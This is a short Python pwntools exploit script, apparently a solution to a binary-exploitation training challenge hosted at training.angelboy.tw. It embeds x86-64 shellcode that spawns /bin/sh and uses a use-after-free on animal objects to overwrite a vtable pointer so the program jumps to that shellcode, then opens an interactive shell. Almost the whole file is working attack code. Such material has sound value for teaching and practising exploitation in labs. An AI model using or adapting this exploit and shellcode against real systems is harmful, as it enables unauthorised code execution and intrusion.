#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "training.angelboy.tw"
port = 11015
context.arch = "amd64"
r = remote(host,port)


sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def add_dog(name,weight):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(weight))

def remove_ani(idx):
    r.recvuntil(":")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(str(idx))


name = 0x605420
r.recvuntil(":")
r.sendline("a"*8 + p64(name+8) + sc)
add_dog("a"*8,0)
add_dog("b"*8,1)
remove_ani(0)
vptr = name + 8
add_dog("a"*72 + p64(vptr),2)
r.recvuntil(":")
r.sendline("3")
r.recvuntil(":")
r.sendline("0")

r.interactive()
